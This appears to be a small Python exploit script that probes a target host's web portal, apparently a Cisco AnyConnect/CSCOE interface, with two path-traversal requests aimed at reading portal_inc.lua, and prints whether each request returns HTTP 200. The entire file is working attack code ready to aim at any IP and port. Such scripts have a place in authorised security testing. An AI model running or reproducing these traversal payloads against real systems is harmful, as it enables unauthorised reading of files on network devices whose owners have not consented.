import re
import requests
import sys
import os

def exploit(dst_addr):
	vuln_list =("/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../","/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua")
	URL="http://"+dst_addr

	for i in vuln_list:
			print(URL+i)
			res = requests.get(URL+i)
			print("Status Code : %d"% res.status_code)

			if res.status_code==200:
					print("Vuln Found")
			else:
					print("Vuln Not Found!")
	
if __name__ == "__main__":
	if len(sys.argv) == 2:
                sys.argv.append('80')
	elif len(sys.argv) < 3:
		print 'Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0])
		sys.exit()

	address =(sys.argv[1], sys.argv[2])
	dst_addr=":".join(address)
	exploit(dst_addr)
